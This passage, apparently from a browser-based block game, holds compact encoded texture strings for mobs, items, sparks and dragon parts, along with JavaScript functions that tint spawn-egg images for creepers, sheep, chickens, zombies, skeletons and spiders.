    cow:"0S0wr000;HQHWW)ZVVH(WZWPW?kHY8WWoHHH$Y00WZZZZWsHPAYkHH0000ygT4xFRgX6-00000000000000000x8RgXx80000RgIT8BF^XM0000000000000005x80000000Rg]M8BF^0000000000000004M80000000RgIF^.0000000000000004x800000000Rp6cF^X0006wSXwRcXwkxa00000000yp8+x8^X0006XwRx8Bx8Tx4lM^00008Xx4yh8TIywI>Qh8Qx4xoRgx4BF8R000g4yh8T4!SIQwQicgQx8TwRgow0000000h_8gp]MI](ITwQicxgXh8XxqMXXw0000000h^g!{M8XwIRgXgXygXgXp68Xg0000000gIRgXx8RgXgXRgXh4RgXiggXgIT800000008Xh8yIygXXRggIygXERi8R0000000EQx8*/Xyg^XxgRXRgRcXFRE^0000000FRh8,MXy8^x8^xgN)F^Xx8T^g0000000000000000002h8R8QmRb^x60000000000002hXrx8Rg8QwXRg^gx80002cT0002h8xw8RgB8Qx4Rg^h)x8S0001IR0002h8R8^X8RgXzwRx8R8wx8(0000IT0002x8T8RXx8RgrRx8Rgx9x840000Xx0002x8ygRXx8Rg8wIRgIT8wM408gIx8RgIT04h8RgRh8Rmp8h8RgTIXx6M808x8zwQx4T04x8TghRgoSIwTx8(I0gXh8Qwx8R04x8T8@8^goTXx8+I>x680gQx8QwXx8R04x8Rp8@9^gT8o@I|xq80gh8QoXh8y04x8Rx6XxF^o@T8yh8T8Rh808T8zQgIT02x8Tx6gXBF^XxEM8Rh8M8Rgh808R(Ix8RgXX02h8ToX!RgkxERx8Rgx4RgXx409RgX8R0ax8R8RgkxERwIRgRwIRgQwX0F^gX9R0awIR8RRgkFRgXR9Rh8R8Qw0E^9^IB0ah8Tg^RkkFRgIR9^h4x8Ri08RxF^gIT0aIR9^kF^gXxF^gIx8+0.0aF^gkF^F^Xx60",
    pig:"0S0wd000]YYHYoWWYQZ00WZZZkHZ0000izzxQQQQ000000000000000000000000zzzyQQQQ000000000000000000000000zzOyQQQQ000000000000000000000000zzONQQQQ000000000000000000000000zOONQQQQ000000000000000000000000zzONQQQQ000000000000000000000000zONNQQQQ000000000000000000000000zOOyQQQQ00000000000000000000izNOzNNzNylhhhh00hhh0000hizyzNONyhlhhhh00hl0000hihyNhxhmhhl00VIV0000hln@hhhl00V0000hihixm@hVhhV00UV0000[hhhlhmVV00VVVV0000QhVhhVlQ[00[hm[G@0000QQGVVGQQQ[Q00QhQQQ000000yh00cyCGK0yxQQQQiyyyzOy00xh00iyx000yyh@GGhyyyNOON00xi00r000NixGGGiyyzOOzi00yy00yB000NixG[iiyzNOzjylhl000000OiGQGiiyOMOjjyxmhh000000ziQiiyOMOjjxyBhm000000ziGQGiiyOxOjjliVhix000000OiQ[iiyzxOjzhyyyyhhh000000OiQhyzxOjNllrr000000NilGQGyzMOjN00000000000000NhlQ[yzMOzN00000000000000yVG]QXGVyyMNOy00000000000000xVGQ[GViyxNOy00000000000000hVGG[GVhiyNyx00000000000000lGGGG[ViyxV00000000000000GQ[QGhl",

    creeper:"0S0w000=W,Y/YW/Y^QYH*H4Y:HY?HYH:HN>W=>Z,YHWW^ZH6WQYZ_3W_3ZY+WWYWWHlH4YY*H)YY5H;Z+WZ-H=W6ZZmW=jZHW+Z^kY.Z.Z2W^YW@WeZYH_OZH.WYeZ9ZYWCY^jZ5H,Y-HCRH^>ZCH.W+ZpY<WHpxYNWqY)YY00WoYZW3W22;WZ^YOZ+Z=>WBxYPUY<zZoYBHPZNjWHNH=ZpwZMH=jW3ZNHWZoZqZ_4Y^W;W<WkYBYZMWmZMHNWMHnYMH?H6W<WNiHqYqYMWlHY<WBYeWeSZmZ[Y<ZCHmWBHBHNRH00000000123456789ab8cdef000000000000000000000000000000000000000000000000ghijk6lcmn8o7p5q000000000000000000000000000000000000000000000000rstuvwkxylzqAkBC000000000000000000000000000000000000000000000000D9cEFyu!n5#w#$%&000000000000000000000000000000000000000000000000%Lynz#(v#$$wM!NC000000000000000000000000000000000000000000000000O94c)*wzf+v#,z*7000000000000000000000000000000000000000000000000-./:;cc<c%Mcc58u000000000000000000000000000000000000000000000000B!/=Wcyt9jSTRcko0000000000000000000000000000000000000000Tm>9QA!9-?m@#[+68o]/P^_zw!vwnR8600000000000000000000000000000000B,{6m|m2}!L$6x!#v~a//C(W*eo/u!&00000000000000000000000000000000pwq4OhrU]VUw*w.AVMkua//B|o00000000000000000000000000000000uWqC]4TDmuxwDwCl#(n?.h0000000000000000000000000000000zn8/LET2|z]K6EQ#vw+&4zM_o7pD00000000000000000000000000000000!]h/?ELq-pUjfoM()$o7q6n!<Ry00000000000000000000000000000000h>hc12&e*!t#.c*o)#y*^o)+Q<00000000000000000000000000000000E#;44Q36j&38-]4#(Mc$8cq7oVu000000000000000000000000000000000000t4]2U00000000~M5wvCqa.6nR!>u900000000000000000000000000000000W~+&000000007<6&j~>gm00000000000000000000000000000000N+BC00000000T9#DEpjqD/LB00000000000000000000000000000000j!dG00000000Q$ohT9CB|q0000000000000000000000000000yD/PAKom2&2mmir22B,zi2Q>sznDr24]0000000000000000000000002T1&/?VMcoCi6+1!pHdg46K_Cj16i0000000000000000000000006!CgnD$yd!m2Xs/q>6c6!tnET000000000000000000000000$HE<$I#R22rTL:&~7V/P9000000000000000000000000ow_MF!]TmTLiov<//L,2Bm/J000000000000000000000000I<w|%2gsL2pQ.B2=m2hTm2Lhm<>00000000000000000000000000000000000000002+42gs26!3h]2nVd0000000000000000000000000000000000000000^^yq]T!Q&~TblNC320000000000000000000000000000000000000000Q/Q42Q33E+0000000000000000000000000000000000000000/L2hiF,$5hLqL0000000000000000000000000000000000000000=/!maV6m|Lht6h1.&0000000000000000000000000000000000000000s422m-kj6fQ72&qm2~000000000000000000000000",
		sheepCombined: [
			/*fur*/"0S0w4000ZZZYW05V0000000000005V0000000000005V0000000000005V0000000000005V0000000000005V00000000000VVV0000000000V0000000000VG005VVVV000VVV005VVVV000YVV005VV000V00d00000000000f00000000000b0000000000VVV000000000VVVV0000000VVVV0000000VVVV0000000VVV000Z0000VVVV00ZZZY000VVV00000VV00000VV00000VVV00G000VVVV00000VVVV000000000VVV000000000VV0000000000000000000000000000000000000000000000000000",
			"0S0wfWY;Z000ZWcW[YHmZHPWc(ZZZZ00WVzZ0hyOxxi0igOOOOOOOOOOOOOOOOOOOOOO0hyO40x01xOOOOOOOOOOOOOOOOOOOOOOQOyOgTix0iOOOOOOOOOOOOOOOOOOOOOOQOyOi0T10gOOOOOOOOOOOOOOOOOOOOOOOOVOg4Tix1OOOOOOOOOOOOOOOOOOOOOOOOVOih1ygiOOOOOOOOOOOOOOOOOOOOOOOOOOxwig01OOOOOOOOOOOOOOOOOOOOOOOOOOgQxh2wOOOOOOOOOOOOOOOOOOOOOOxkTA1SwRkT1xg2OOO@GKG]GKOOOOOO02G7wigihOOOG@G0@GOOOOOOgiKG6x01h2OOOG664]GOOOOOOx01og00ig1OOOG@GGOOOOOOh0w1mg20w10gOOO66Gn6K6OOOOOOwh1yoyghx2hxOOO@]@oOOOOOOOOOOOOOOOOOOOOK4747GGOOOOOOOOOOOOOOOOOO1GGkOOOOOyyyOyOOOOOO60GGGG6OOOOw3xiw3OOOOOOm6Sm@@6GKOOOOz2x1(yOOOOOO6GKK@G8@@SOOOOOzw1yOOOOOOOG8oGG@G[6OOOO1wg11w1yOOOOOO6IGKGGK6OOOOgi10i02gOOOOOO0G46G6GOOOOw0gg0110OOOOOOK@6GKK@GGOOOOg1xx0ig1OOOOOOK@GKGOOOOOOOOOO@41G@GK7Q6OOOOGOOOOOOG06KG@GOOOOGGOOOOOOGmm]SGm@G@OOOOGGOOOOOOK]G6OOOOIOOOOOOGGKG@6@]6QOOOOGOOOOOO6GQGm@@OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
		],
    spawnCreeper: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 13, g = 167, b = 11
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 0, g = 0, b = 0
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
    gunpowder: "0g0g8000?WVVHWEYPAY$Z;Z000000000000000000001w0000a0000G000200m00Y03q0+00dYK000+00000000000000",
	  rottenFlesh: "0g0gc000WEYIYiWhYWMYKW5YYY0000000000000i000000hN000001??w0000jy000p>001[w00m>U+001)@00m>>w1[N01?+-Iw00hOy0001)yw00000y0000000000000",
    spawnSheep: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 231, g = 231, b = 231
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 255, g = 181, b = 181
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
    chicken:"0S0wf000ZZZW|WQWZHZWsHUW0WYY00W+W01xjO(00?Q0000700000000000000001ijI(00P0000G0000000000000001xo0QQQQ00000000000000000hhhhhhh000000000000000000htyxxy0000000000000000000000xyyyyyN0000000000000000000000NyyyzzO00000000000000000000OzNOO00000000000000000000O--II0000000000000000000000000000yyyxhi00000000000000000000000000Nyzxhi00000000000000000000000000NNzNhz00000000000000000000000000NN-y-00000000000000000000000000N--I000000O0000000000000000000IOIO-000000y0000000000000000hiOyyyOxhNON000y0000000000000000hiONyzOxhyNM000h0000000000000000hi-OyOxhxxx000h0000000000000000hj-OOOMhhxh000h0000000000000000iz-O-NxhhhMxjjhxO0000000000000yz-IIINyxhxxyhhixz0000000000000NO-IIIOzxzNhxxxi-0000000000000IIIIIIIIIN--ONNONI0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    spawnChicken: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 161, g = 161, b = 161
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 255, g = 0, b = 0
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
    feather: "0g0g5000|WHZZZZ00000000000000002000002S0000k00000000S000&y0008mS00E00000i008001Bbw0001w000000000",
    zombie:"0S0SC000<Z.ZPH|H.RHlH?HVYHVYVZYoYPWPZV$ZEY3;Z*H(W2Z-YQHAY1Z1Y2Z2Y2Y1YVH;ZY|)Z-ZHW0000004wR8g8gT4gR0000000000000000000000000000000000004g8(4w8w0000000000000000000000000000000000004S4(8x?k0000000000000000000000000000000000004T24(8x?k0000000000000000000000000000000000008M34S4x?k0000000000000000000000000000000000008g4SR4x?k000000000000000000000000000000000000cwcwRcg8w>0000000000000000000000000000000000004wR4wQc(T4g0000000000000000000000000000008wcw4g8w4wg(4w8g0000000000000000000000004g4g4wo(c(T8wTgwR4wR0000000000000000000000008w8w>g9Ecg4(cwQg(0000000000000000000000004wRcSoE6g(>8g8g4wT0000000000000000000000008M34((^o{gM1cS8ST8h20000000000000000000000008wTc(g8X4(4g4(cg>0000000000000000000000004g?ggR4;z8gQkgT8gg(R0000000000000000000000008w4g8x?8T4(Tc(8w>cg000000000000000000000000000T4g?k000000P)|)?k?k000000VAcT3000000000000T4g?k000000]?k?k?k000000PAJg(000000000000T4g?k000000]?k?k?k000000PAJcw000000000000T4g?k000000P)|)?k?k000000VA4g000000000?ko4DrlVrVAVA000000?kk9VVVrVVVVVV000000?kkVVlVVVVVVV000000?kVVVVVVtt000000?mVVVV4gTo4gT(c000000rVVcM2E4ws000000VsVs4(scx1t000000VVrV8STsgh2o000000?kVVVsV8Ssg(o0000005k]worlVs4(XE4(Ts0000008w.x8yoolklg(Xs78gXt000000E]EkkcSQ(8S>p000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    spawnZombie: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 0, g = 175, b = 175
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 121, g = 156, b = 101
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		skeleton:"0S0wc000H-ZZZH|W$YWPAY8WH0000hxhhiyyy000000000000000000000000j>OMg002000000000000000000000000O)OOg002000000000000000000000000O*>g002000000000000000000000000))g002000000000000000000000000@mOg002000000000000000000000000O*Og001000000000000000000000000OOhyyh00000000000000000000QO)OO>OOO>OQQOOQ0000000000000000QO>O,O)OQQ>)Q0000000000000000V>O,O)VUQQ?0000000000000000VOO*VVVVV0000000000000000hkA.RThlVV0000000000000000xjQQ/QQMiyhhy0000000000000000#x/yFJyiyyyy0000000000000000y>OOOO)y#00000000000000000xx00000000000kTh>000ii0000000000ii00000000000(1g3000xx0000000000000000000S3S40000000000TMTM0000000000hQjT00TMTM00000000****0000yh>00)hylBR****00000000*?*?0000002(3w00040*?*?00000000BBh0000ykO@)OTyljTO???00000000))y0000004)>S0007(0>00000000llll0000yhSmM4hylzllll00000000kkkk00000043(S0004(000000000UUUU0000002(3w0004S0>>>>00000000VVVV000000000000010>>>>00000000iiii00000000000002g0iiii00000000TTTT00000000000001w0))))0000000000000000Gw2@G*>00000000000000000000?h[RAhUU>)?000000000000",
		spawnSkeleton: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 193, g = 193, b = 193
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 73, g = 73, b = 73
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		bone: "0g0g6000qHWZZYZZZ0000000000kS0000w000000000005w000%00010000b0002001#0009K0005q0000K000090000000000",
		spawner: "0g0g7EHoYFlHTYsH000lW4Py]?$?$|@r|cVQ]oPR-$q3S$]6$o^Q$X|c?$4Py]",
		daylightDetectorInvertedTop: "0g0g8;W*5YWZQYHZ<Y0000005Oakal#et:7etiPAJPw5Oakal#et:7etiPAJPw5Oakal#et:7et000000",
		daylightDetectorSide: "0g0g8;WViY|2Y(Y]HSH;W$H0000004FJ6^E6^Ead4FJ6^E6^Ead4FJ6^E6^Ea000000",
		daylightDetectorTop: "0g0g9;WOWaYQYZ#YZHZ000000001yjixMyg2?DN?K2BCN1jmMg3OOOOOO(1yjixMyg2?A@N?K2BEN1jmMg3OOOOOO(1yjixMyg2?AN?K2RBEN1jmMg00000000",
		caveSpider: "0S0we0000TW8YgJW0Y0WkH.jY;0Ww0W(ZJDZoZ7H000hxhxxy0zR)zNRMzN>)ONRMz000000000yNxxxi0yj)OzjxOOjANOjMN000000000zzyxhiTOjxzOjAzkNjMzNj)z00000000zzNyhikyRMON>)OTO>xOzR)O00000000jNNyhy00000000000hzNhN*VN0000000iNxyiy00000000000i*OxzV0000hOzxxyiMhxxy00000000zzB*O0000iONxxizNxxxi00000000O*lBNN0000iONxhiOOxxhi00000000NVjzOx0000izOyhiOzxyhi00000000CiOyh0000hzzyhyzNhyhy00000000hihh0000hyzyiyMxhyiy00000000mhhhh0000000000yV*zyyyOjVEJ*VMONyy000000V**NjyizBzCN+NhhO000000*OBOyOiii*ONqzOzxiiO000000NNOhiiNNmzOxjOy000000VxxhzjON,zzyMOi000000OBxhjOzxNyizhii000000VxhiOOhy;yhOhhz000000Nhxijhh;ht;hhhNyzO000000+Nihhy0000000000000000000000*BNOyhhi0000000000000000000000z+**OMhyN0000000000000000000000*ONOzzNhzO0000000000000000VzOON+*yON*000000000VzD*z*O+z*yOVN000000000O+B*OyOzOCy*VN000000000*zONVOVOzzzNONizzy000000000OOCOMzzzzyjNOiOBzOy000000000hOMhiOONxhjNONhiNyONx000000000jOVVMhzxjxjV*OMhixNxx000000000hjOOOhhOhhMhOOOMhhhxyhh000000000",
		spider: "0S0we000AY(H;ZAYQH|jZUY;0Ww0W(ZJDZoZ7H000hxhxxy0zR)zNRMzN>)ONRMz000000000yNxxxi0yj)OzjxOOjANOjMN000000000zzyxhiTOjxzOjAzkNjMzNj)z00000000zzNyhikyRMON>)OTO>xOzR)O00000000jNNyhy00000000000hzNhN*VN0000000iNxyiy00000000000i*OxzV0000hOzxxyiMhxxy00000000zzB*O0000iONxxizNxxxi00000000O*lBNN0000iONxhiOOxxhi00000000NVjzOx0000izOyhiOzxyhi00000000CiOyh0000hzzyhyzNhyhy00000000hihh0000hyzyiyMxhyiy00000000mhhhh0000000000yV*OzyyyOjVEJ*VMONyy000000V**NjyizBzCN+NhhO000000*OBOyOiii*ONqzOzxiiO000000NNOhiiNNmzOxjOy000000VxxhzjON,zzyMOi000000OBxhjOzxNGyizhii000000VxhiOOhy;yhOhhz000000Nhxijhh;hthhhNyzO000000+Nihhy0000000000000000000000*BNOyhhi0000000000000000000000z+*OOMhyN0000000000000000000000OONOzzNhzO0000000000000000VzOON+*yON*000000000VzD*z*O+z*yOVN000000000O+B*OyOzOCy*VN000000000*zONVOVOzzzNONizzy000000000OOCOMzzzzyjNOiOBzOy000000000hOMhiOONxhjNONhiNyONx000000000jOVVMhzxjxjV*OMhixNxx000000000hjOOOhhOhhMhOOOMhhhxyhh000000000",
		spiderEyes: "0S0w40000WK0W(Z0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000g8000000000000008g00000000000003S3S000000000000100000000000006K0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		spawnCaveSpider:function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 12, g = 66, b = 78
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 168, g = 14, b = 14
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		spawnSpider:function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 52, g = 45, b = 39
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 168, g = 14, b = 14
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		spark_0: "08082000ZZZ000k8k00",
		spark_1: "08083000ZZZW00000012K10000",
		spark_2: "08083000ZZZW00004412K14400",
		spark_3: "08083000WZZZ000015a5100",
		spark_4: "08084000ZZZW;Z00g16A92K97Ag1",
		spark_5: "08083000ZZZW000S2Kala2K0S",
		spark_6: "08083000ZZZW00g16A92K96Ag1",
		spark_7: "08083000ZZZW000S2Kala2K0S",
		"dragon0": "0g0ga000?kHPAY|)ZZYWHVVHW000hx000000iy000000jO000000xh000000Qi000000Vj000xhChxhAXRXAXRiOp.Ojhx]oxhx000000000000000000000000000000000000000000000000",
		"dragon1": "0g0g3kHsZoY000010all!pa5l!p0000",
		"dragon2": "0g0g3kHsZoY0000001all!9all!p0000",
		"dragon3": "0g0ga000?kHPAY|)ZZYWHVVHW000hx000000iy000000jO000000xh000000Qi000000Vj000xhChxhAXRXAXRiOp.Ojhx]oxhx000000000000000000000000000000000000000000000000",
		"dragon4": "0g0g3kHsZoY000010!lll!ap9!al5BBaa99aa",
		"dragon5": "0g0g3kHsZoY0000109a5l!p!lBa9a",
		"dragon6": "0g0g3kHsZoY0000p0",
		"dragon7": "0g0g4000kHoY8wY0V000V000000V00VVV000000000000000000000000000000000000000000",
		"dragon8": "0g0g6000kHsZoYc(ZgTW000AJP000AP000000B000FCJ000FCJ000%000B000000B000BCJ000%CJ000B000B000000%#",
		"dragon9": "0g0g4kHoYsZc(Z00004A00VVTVRmVV1V0VV0V2mVV0VJT",
		"dragon10": "0g0g6kH000sZoYc(ZgTW00002PP2S2PP]NP2PCJ2PCJNP2PP]2PP]NPPCJ2PCJNPPP]2PP]NP#2P",
		"dragon12": "0g0g4000kHoYsZ0000000000000000000000000000000000000000000000000VVV000",
		"dragon13": "0g0g3kHsZoY0000011!!l5lBaa99a!00!!!!00001T0!a",
		"dragon14": "0g0g4kH000sZoY00VVwVVVVZVVVVVVZVVVVVVZVV!VVWWVV0000eeZWZ",
		"dragon15": "0g0g4000kHsZoY000000000000000000000000000000000000000000000000V000000000000",
		"dragon16": "0g0g3kHoYsZ0000mVl5VV6lVVU!!5VVU65VVUaqlVVUC",
		"dragon17": "0g0g3kHoYsZ0000ll5VVClVV!K!lVVUC5VVUaqlVVUC",
		"dragon18": "0g0g3kHoYsZ0000ll5VVClVV!K!5VVU65VVUa!lVVUC",
		"dragon19": "0g0g3kHoYsZ0000mql5VVU6lVV!!lVVUC5VVaKq5VVU6",
		"dragon20": "0g0g3kHsZoY55BBa!9all!pp!al5lB!ap9",
		"dragon21": "0g0g3oYsZkHlmllkl020h0a0lqllgl020h020lmllkl0a0",
		"dragon22": "0g0g3oYsZkHlllqlllk00020002lllmlllk000a000alllqlllg0002",
		"dragon23": "0g0g4000kHoYsZ00000000000000000000000000000000VVVVVVHY00000000",
		"dragon24": "0g0g7000kHsZoYgTWc(ZwW000FDy000FDy000%000F!000!000B000BDy000%DyAJPBPPB!P!%JPC%CAJPAJPAJPP",
		"dragon25": "0g0g6oYsZgTWc(ZkHwW4PiS^4P00^0)0JS3AATJRRAAT22R0+0JS34PJ]^4P820)0JPAAATN]TAATyiT0+0iS0]80JPAJPAJipA",
		"dragon26": "0g0g6c(ZsZoYgTWkH0004@_4?#A2P_iB_iC#9Aq^_4J_9E#JPAJPABpApABiBiPAJPAJJP9@QPEJEJ",
		"dragon27": "0g0g4000kHoYsZ00000000000000000000000000000000VVVVVVH00000000",
		"dragon28": "0g0g4000kHsZoY000Z000Z00VZHZH0HZ0",
		"dragon29": "0g0g3kHsZoYllll!!99aa55BBaa99!!lllB!ap9",
		"dragon30": "0g0g3oYsZkHlqllkl02010a0lqllgl020h020lmllkl020",
		"dragon31": "0g0g4oYsZkH000qZZZgZZZaZZZZZZZZZ2ZZZqZZZgZZZ2ZZZZZZZZZ2ZZZqZZZgZZZaZZZZZZ",
		"dragon32": "0g0g3oYsZkHh002llmllk002100allqllg00a100am",
		"dragon33": "0g0g3oYsZkHh00allqllg00a1002llmllk002h00alm",
		"dragon34": "0g0g3oYsZkHh002llmllg00a1002llmllk002100al!",
		"dragon35": "0g0g3oYsZkH1002llmllg00ah00allmllk002100al!!",
		"dragon36": "0g0g3oYsZkH110alqlg0ahh000llllll000102lqlg",
		"dragon37": "0g0g3sZoYkH49Q4VVS^SS?SVV4aX449U4VVS^SS?SVV46445U4VVSRSSTS",
		"dragon38": "0g0g3sZoYkH4445VVVSSSRSSSTVVV444a4449VVVSSS^SSS?VVV44464445VVVSSSRSSST",
		"dragon39": "0g0g4000kHoYsZ00000000000000000000000000000000000000000000000000000000VVVV",
		"dragon40": "0g0g4oYsZkHwW12qgao10amllk00a8o8Y",
		"dragon41": "0g0g3oYsZkHh002llqllg0021002llqllg00a0g8",
		"dragon42": "0g0g4000kHoYsZ00000000000000000000000000000000000000000000000000000000VVVVH",
		"dragon44": "0g0g9000oYsZkHc(Z8wYfYbZ00W00iiyiyh00Ohhhhj00Oyiyiz00Myiyix00Mhhhhj00Niyiyj00iiyiyM00OhhhhO00OyiyiO00Myiyih00OhOhOO00OOOOOOhMhMhMkOMMhhO)Oyiyiz)Myiyih)",
		"dragon45": "0g0gaoYsZkHYfY8wYc(Z000bZ00W01h1h011y00002w0yh1h1yxhwh1h10xhw0000yw0x1h1hyx111h1hw11w0000yy0xh1h1iyhwh1h1gwhyyw02yywyyyyyyyyOO?KGGGGOO?GGGG>)GGGGQQKGGGG",
		"dragon46": "0g0g4sZoYkH00049Q4VVS^SS?SVV46X445U4VVSRSSTSVVZZZZZZZZZZZZZZZZ",
		"dragon47": "0g0g4sZkHoY0006ZZZZZZZZZZZZZZZ9ZZZaZZZZZZZZZZZZVZZZVZZZZZZZZZZZZZZZZZZZ",
		"dragon52": "0g0g3kHoYsZ5V5C6lV5!Ka!q5V5665V5a!q5VVV60000",
		"dragon53": "0g0g3oYkHsZ05S0y05S0!B!!E^!010y01S0!F!!E!01S044VVVV",
		"dragon54": "0g0g3oYkHsZ00010001!!!F!!!w00050005!!!B!!!w0005Xy4VVVV",
		"dragon55": "0g0g4kHoYsZ0005VV65VSU!KFlllVVC51VUaq0l0g0000ZZZZZZZZ",
		"dragon56": "0g0g8kHwWoYsZYfYc(Z00000]0d0b0}_ia2Rgd|9wJ9wJ000000000000]A]A0AJ00AJ09AJJ000000000000ZZZZZZZZZZZZ",
		"dragon57": "0g0g4kHoYsZ0005VV6l1VU!qllB5VV6lVSUaq0l40000ZZZZZZZZ",
		"dragon58": "0g0g4kHoYsZ0005VV6lVVU!!lVVC5VVUaq41S0000ZZZZZZZZ",
		"dragon59": "0g0g4000kHoYsZ000000000000000000000000000000000000000000000000VVVVV",
		"dragon60": "0g0g6kHoYc(Z8wY00WsZ0JPA00|0)|J4JPA02)04402P000b|00Ar|AiJ02P00J2%)0J4P4P0000000b|00)||01A00",
		"dragon61": "0g0g800WbZ8wYc(ZkH000oYsZ40000PAPAPAPAPAJPAJPAZPDPAZHZP+",
		"dragon62": "0g0g8000?kH|)ZPAYkHsZoYVVH000000000000000000000000000000000Fw000000000000]0000B0000%0000Fw0JPA00]0A0",
		"dragon64": "0g0g3kHoYsZ0000lll5VVVClVVV!!lVVVC5VVVaqlVVVC",
		"dragon65": "0g0g3kHoYsZ0000llVVVVVVVVVVVVVVVVVVVV",
		"dragon66": "0g0g3kHoYsZ0000llVVVVVVVVVVVVVVVVVVVV",
		"dragon67": "0g0g3kHoYsZ0000lmlVVVVVVKVVVUVVVUVVV",
		"dragon68": "0g0g3kHoYsZ0000ml5VVV6lVVV!!5VVV65VVVaqlVVVC",
		"dragon69": "0g0g3kHoYsZ0000VBlV5VCVUlVaqVU5V6V5VKa!VlVC",
		"dragon70": "0g0g3kHoYsZ0000lVVVVVVVVVVVVVVVVVVVV",
		"dragon71": "0g0g3kHoYsZ0000lqVVVVVVVVVVVVVVVVVVVV",
		"dragon72": "0g0g3kHoYsZ0000VVVVVVVVVVVVVVVVVVVVV",
